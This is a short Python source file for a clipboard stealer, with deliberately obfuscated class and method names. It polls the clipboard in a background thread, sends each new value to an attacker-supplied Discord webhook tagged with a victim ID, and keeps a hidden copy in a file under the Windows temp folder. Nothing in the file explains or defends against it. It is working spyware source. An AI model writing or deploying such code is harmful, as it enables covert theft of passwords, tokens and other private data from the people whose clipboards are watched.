import time
import os
import pyperclip
import threading
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

class Cl1111pb00ardM000nitor:
    def __init__(self, interval, ID, webhook):
        self.id = ID
        self.interval = interval
        self.webhook = webhook
        self.recent_value = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        global STOP
        STOP = False

    def report_to_webhook(self, content):
        global STOP
        if STOP:
            return
        webhook = DiscordWebhook(url=self.webhook, username="Clipboard Logger")
        embed = DiscordEmbed(title=f"Clipboard Report | ID #{self.id} | Time: {self.end_dt}", description=content)
        webhook.add_embed(embed)
        webhook.execute()

    def m000n111t0r(self):
        global STOP
        while not STOP:
            tmp_value = pyperclip.paste()
            if tmp_value != self.recent_value:
                self.recent_value = tmp_value
                self.end_dt = datetime.now()
                self.report_to_webhook(self.recent_value)
                with open(os.environ["temp"] + "\\clipboard.txt", "a") as f:
                    f.write(f"{self.end_dt} - {self.recent_value}\n")
            time.sleep(self.interval)

    def start(self):
        global STOP
        STOP = False
        threading.Thread(target=self.m000n111t0r).start()

    def stop(self):
        global STOP
        STOP = True